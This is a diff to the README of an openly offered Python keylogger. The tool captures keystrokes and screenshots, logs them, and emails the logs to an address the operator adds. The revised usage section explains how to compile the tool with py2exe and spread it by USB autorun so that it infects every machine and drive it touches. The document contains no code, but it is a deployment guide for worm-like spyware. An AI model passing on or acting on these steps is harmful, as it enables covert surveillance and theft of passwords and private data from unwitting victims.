@@ -1,6 +1,6 @@
 Keylogger
 =========
-A Python keylogger that monitors for keyboard events, writes to a log file, and then uploads to an email address. It spreads through usb storage devices using an autorun.inf file.
+A Python keylogger that monitors for keyboard events, writes to a log file, and then uploads to an email address.
 ---------
 Dependencies
 ------------
@@ -13,7 +13,7 @@ Dependencies
 -ImageGrab
 Usage
 -----
-Compile all the python files to executables using py2exe. I'll provide a single setup.py script to do this in an upcoming release. Add all the .exes to a flash drive, and create an autorun.inf file pointing to keylog_runner.exe.
+Add an email to upload.py. Compile all the python files to executables using py2exe. I'll provide a single setup.py script to do this in an upcoming release. Add all the .exes to a flash drive, and create an autorun.inf file pointing to keylog_runner.exe. When the flash drive is plugged into a USB port, the computer becomes infected. When a clean USB storage device is then plugged into an infected computer, the storage device becomes infected.
 Changelog
 ---------
 1.0 - Uploaded
